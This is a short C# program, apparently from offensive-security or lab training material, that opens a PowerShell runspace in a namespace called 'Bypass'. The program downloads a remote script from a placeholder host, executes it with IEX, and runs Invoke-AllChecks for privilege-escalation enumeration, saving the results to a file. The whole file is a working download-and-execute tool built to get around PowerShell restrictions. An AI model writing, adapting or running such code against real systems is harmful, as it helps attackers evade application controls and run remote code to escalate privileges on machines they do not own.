using System;
//We need to import the references in visual studio Solution Explorer and select Add Reference
// C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
using System.Management.Automation;
using System.Management.Automation.Runspaces;


namespace Bypass
{
  class Program
  {
    static void Main(string[] args)
    {
      //create a runspace object
      Runspace rs = RunspaceFactory.CreateRunspace();
      rs.Open();
      String cmd = "(New-Object System.Net.WebClient).DownloadString('http://someIP/myscript.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Tools\\test.txt";
      
      PowerShell ps = PowerShell.Create();
      ps.Runspace = rs;
      ps.AddScript(cmd);
      ps.Invoke();
      rs.Close();
    }
  }
}